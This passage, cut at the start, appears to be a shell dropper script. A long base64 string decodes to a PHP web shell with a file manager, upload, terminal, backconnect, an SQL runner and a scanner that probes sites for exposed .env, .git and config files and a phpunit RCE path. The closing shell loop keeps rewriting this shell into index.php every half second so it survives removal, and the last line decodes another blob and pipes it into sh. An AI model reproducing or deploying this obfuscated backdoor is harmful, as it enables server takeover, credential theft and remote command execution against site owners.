GZhaWxlZC48L3A+IjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgJGNvbm4gPSBAbXlzcWxpX2Nvbm5lY3QoJF9TRVNTSU9OWydzcWxfaG9zdCddLCAkX1NFU1NJT05bJ3NxbF91c2VyJ10sICRfU0VTU0lPTlsnc3FsX3Bhc3MnXSwgJF9TRVNTSU9OWydzcWxfZGInXSk7CiAgICAgICAgaWYgKCEkY29ubikgewogICAgICAgICAgICB1bnNldCgkX1NFU1NJT05bJ3NxbF9jb25uZWN0ZWQnXSk7CiAgICAgICAgICAgIGVjaG8gIjxwIHN0eWxlPSdjb2xvcjpyZWQ7Jz7inYwgTG9zdCBjb25uZWN0aW9uLiBQbGVhc2UgcmVjb25uZWN0LjwvcD48YSBocmVmPSc/c3FsbWdyJz5UcnkgQWdhaW48L2E+IjsKICAgICAgICAgICAgZm9vdGVyKCk7IGV4aXQ7CiAgICAgICAgfQoKICAgICAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnPgogICAgICAgIDx0ZXh0YXJlYSBuYW1lPSdxdWVyeScgcm93cz0nNScgcGxhY2Vob2xkZXI9J1NFTEVDVCAqIEZST00gdXNlcnMnPjwvdGV4dGFyZWE+PGJyPgogICAgICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3J1bicgdmFsdWU9J1J1biBRdWVyeSc+CiAgICAgICAgPGEgaHJlZj0nP3NxbG1nciZsb2dvdXQ9MSc+8J+UjCBEaXNjb25uZWN0PC9hPgogICAgICAgIDwvZm9ybT4iOwoKICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xvZ291dCddKSkgewogICAgICAgICAgICBzZXNzaW9uX3Vuc2V0KCk7IHNlc3Npb25fZGVzdHJveSgpOwogICAgICAgICAgICBlY2hvICI8cD7wn5SMIERpc2Nvbm5lY3RlZC48L3A+PG1ldGEgaHR0cC1lcXVpdj0ncmVmcmVzaCcgY29udGVudD0nMTt1cmw9P3NxbG1ncic+IjsKICAgICAgICAgICAgZm9vdGVyKCk7IGV4aXQ7CiAgICAgICAgfQoKICAgICAgICBpZiAoaXNzZXQoJF9QT1NUWydydW4nXSkgJiYgIWVtcHR5KCRfUE9TVFsncXVlcnknXSkpIHsKICAgICAgICAgICAgJHNxbCA9ICRfUE9TVFsncXVlcnknXTsKICAgICAgICAgICAgZWNobyAiPGgzPlF1ZXJ5OjwvaDM+PHByZT4iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbCkuIjwvcHJlPiI7CiAgICAgICAgICAgICRyZXMgPSBAbXlzcWxpX3F1ZXJ5KCRjb25uLCAkc3FsKTsKICAgICAgICAgICAgaWYgKCRyZXMgPT09IHRydWUpIHsKICAgICAgICAgICAgICAgIGVjaG8gIjxwPuKchSBRdWVyeSBPSyAobm8gcmVzdWx0KTwvcD4iOwogICAgICAgICAgICB9IGVsc2VpZiAoJHJlcykgewogICAgICAgICAgICAgICAgZWNobyAiPHRhYmxlIGJvcmRlcj0xIGNlbGxwYWRkaW5nPTU+PHRyPiI7CiAgICAgICAgICAgICAgICAkZmllbGRzID0gbXlzcWxpX2ZldGNoX2ZpZWxkcygkcmVzKTsKICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRmaWVsZHMgYXMgJGYpIGVjaG8gIjx0aD57JGYtPm5hbWV9PC90aD4iOwogICAgICAgICAgICAgICAgZWNobyAiPC90cj4iOwogICAgICAgICAgICAgICAgd2hpbGUgKCRyb3cgPSBteXNxbGlfZmV0Y2hfYXNzb2MoJHJlcykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICI8dHI+IjsKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkcm93IGFzICR2KSBlY2hvICI8dGQ+Ii5odG1sc3BlY2lhbGNoYXJzKCR2KS4iPC90ZD4iOwogICAgICAgICAgICAgICAgICAgIGVjaG8gIjwvdHI+IjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVjaG8gIjwvdGFibGU+IjsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGVjaG8gIjxwIHN0eWxlPSdjb2xvcjpyZWQ7Jz7inYwgRXJyb3I6ICIubXlzcWxpX2Vycm9yKCRjb25uKS4iPC9wPiI7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBlY2hvICI8YSBocmVmPSc/Jz5CQUNLIFRPIE1FTlU8L2E+IjsKICAgIGZvb3RlcigpOyBleGl0Owp9CgovLyA9PT0gTGFyYXZlbCBWdWxuZXJhYmlsaXR5IEZpbmRlciA9PT0KaWYgKGlzc2V0KCRfR0VUWydsYXJhdmVsZmluZGVyJ10pKSB7CiAgICBoZWFkKCJMYXJhdmVsIFZ1bG4gRmluZGVyIik7CiAgICBlY2hvICI8aDI+8J+UjSBMYXJhdmVsIFZ1bG4gRmluZGVyPC9oMj4KICAgIDxmb3JtIG1ldGhvZD0ncG9zdCc+CiAgICAgICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3RhcmdldCcgcGxhY2Vob2xkZXI9J2h0dHBzOi8vZG9tYWluLmNvbSc+CiAgICAgICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J1NjYW4nPgogICAgPC9mb3JtPiI7CgogICAgaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcgJiYgIWVtcHR5KCRfUE9TVFsndGFyZ2V0J10pKSB7CiAgICAgICAgJHVybCA9IHJ0cmltKCRfUE9TVFsndGFyZ2V0J10sICcvJyk7CiAgICAgICAgJGNoZWNrcyA9IFsKICAgICAgICAgICAgJy8uZW52JyA9PiAnIExhcmF2ZWwgLmVudicsCiAgICAgICAgICAgICcvLmdpdC9jb25maWcnID0+ICcgR2l0IEV4cG9zZWQnLAogICAgICAgICAgICAnL3ZlbmRvci9jb21wb3Nlci9pbnN0YWxsZWQuanNvbicgPT4gJyBDb21wb3NlciBJbnN0YWxsZWQgUGFja2FnZXMnLAogICAgICAgICAgICAnL3ZlbmRvci9waHB1bml0L3BocHVuaXQvc3JjL1V0aWwvUEhQL2V2YWwtc3RkaW4ucGhwJyA9PiAnIGV2YWwtc3RkaW4ucGhwIFJDRScsCiAgICAgICAgICAgICcvY29uZmlnL2RhdGFiYXNlLnBocCcgPT4gJyBMYXJhdmVsIERCIENvbmZpZycsCiAgICAgICAgXTsKCiAgICAgICAgZWNobyAiPGgzPkhhc2lsIFNjYW4gdW50dWsgPGNvZGU+JHVybDwvY29kZT48L2gzPjx1bD4iOwogICAgICAgIGZvcmVhY2ggKCRjaGVja3MgYXMgJHBhdGggPT4gJGRlc2MpIHsKICAgICAgICAgICAgJHRlc3QgPSBAZmlsZV9nZXRfY29udGVudHMoJHVybCAuICRwYXRoLCBmYWxzZSwgc3RyZWFtX2NvbnRleHRfY3JlYXRlKFsnaHR0cCcgPT4gWyd0aW1lb3V0JyA9PiA1XV0pKTsKICAgICAgICAgICAgaWYgKCR0ZXN0ICE9PSBmYWxzZSAmJiBzdHJsZW4oJHRlc3QpID4gMTApIHsKICAgICAgICAgICAgICAgIGVjaG8gIjxsaSBzdHlsZT0nY29sb3I6bGltZTsnPuKchSAkZGVzYyBkaXRlbXVrYW4gZGkgPGNvZGU+JHBhdGg8L2NvZGU+PC9saT4iOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZWNobyAiPGxpIHN0eWxlPSdjb2xvcjpncmF5Oyc+4p2MICRkZXNjIHRpZGFrIGRpdGVtdWthbjwvbGk+IjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlY2hvICI8L3VsPiI7CiAgICB9CgogICAgZWNobyAiPGEgaHJlZj0nPyc+QkFDSyBUTyBNRU5VPC9hPiI7CiAgICBmb290ZXIoKTsKICAgIGV4aXQ7Cn0KCi8vID09PSBNRU5VIFVUQU1BID09PSAvLwpoZWFkKCJGaWxlTWFuYWdlciIpOwplY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdodHRwczovL2kucmVkZC5pdC9udzl1Mnd5bzlocWMxLmdpZicgYWx0PSdMb2dvJyB3aWR0aD0nMzAwJz48aW1nIHNyYz0naHR0cHM6Ly9pLnJlZGQuaXQvbnc5dTJ3eW85aHFjMS5naWYnIGFsdD0nTG9nbycgd2lkdGg9JzMwMCc+PGJyPjwvY2VudGVyPgo8aDI+PGNlbnRlcj4+PiBXZWxjb21lIDw8PC9jZW50ZXI+PC9oMj4KPGRpdiBjbGFzcz0nbWVudSc+CiAgICA8YSBocmVmPSc/Zm09MSc+8J+TgiBGaWxlIE1hbmFnZXI8L2E+CiAgICA8YSBocmVmPSc/dXAnPvCfk6QgVXBsb2FkIEZpbGU8L2E+CiAgICA8YSBocmVmPSc/YWRtaW5lcic+8J+nqSBBZG1pbmVyPC9hPgogICAgPGEgaHJlZj0nP2NtZCc+8J+SuyBUZXJtaW5hbDwvYT4KICAgIDxhIGhyZWY9Jz9iYWNrY29ubmVjdCc+8J+UgSBCYWNrY29ubmVjdDwvYT4KICAgIDxhIGhyZWY9Jz9sYXJhdmVsZmluZGVyJz7wn6eqIExhcmF2ZWwgVnVsbiBGaW5kZXI8L2E+CiAgICA8YSBocmVmPSc/c3FsbWdyJz7wn6euIFNRTCBNYW5hZ2VyPC9hPgogICAgPGEgaHJlZj0nP2luZm8nPuKEue+4jyBQSFAgSW5mbzwvYT4KICAgIDxhIGhyZWY9Jz9zeXNpbmZvJz7wn6egIFN5c3RlbSBJbmZvPC9hPgo8L2Rpdj4iOwoKZm9vdGVyKCk7Cj8+Cg=="
while true; do 
        echo $datanya | base64 -d > $dirnya/index.php
        mkdir -p $dirnya/
	chmod 0644 $dirnya/
        chmod 0755 $dirnya/
        sleep 0.5
done"
echo $miuae | base64 -d | sh
